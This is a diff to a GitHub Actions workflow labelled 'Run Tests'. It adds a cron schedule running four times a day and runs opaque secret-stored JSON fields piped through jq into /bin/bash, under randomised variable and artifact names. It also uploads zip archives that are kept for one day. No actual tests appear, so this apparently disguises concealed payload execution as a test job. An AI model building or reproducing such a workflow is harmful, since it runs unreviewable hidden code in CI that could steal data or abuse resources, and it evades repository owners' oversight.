@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '55 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,17 +16,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run pipeline
         env:
-          anvop6886: ${{ secrets.anvop6886 }}
+          l22066: ${{ secrets.l22066 }}
         run: |
-          printf '%s' "$anvop6886" | jq -r .q1218 | /bin/bash
-          printf '%s' "$bx1034" | jq -r .hg3 | /bin/bash
-          printf '%s' "$fzbcg92" | jq -r .dipm13 | /bin/bash
-          printf '%s' "$l4902" | jq -r .f72559 | /bin/bash
-          printf '%s' "$hps3797" | jq -r .z0 | /bin/bash
+          printf '%s' "$l22066" | jq -r .qtuf12 | /bin/bash
+          echo $lde2147 | jq -r .amof85 | /bin/bash
+          printf '%s' "$eway949" | jq -r .becqb32158 | /bin/bash
+          printf '%s' "$tacak851" | jq -r .f840 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
         with:
-          name: gqEdksFS
+          name: AlTLFnmX
           path: "*.zip"
           retention-days: 1
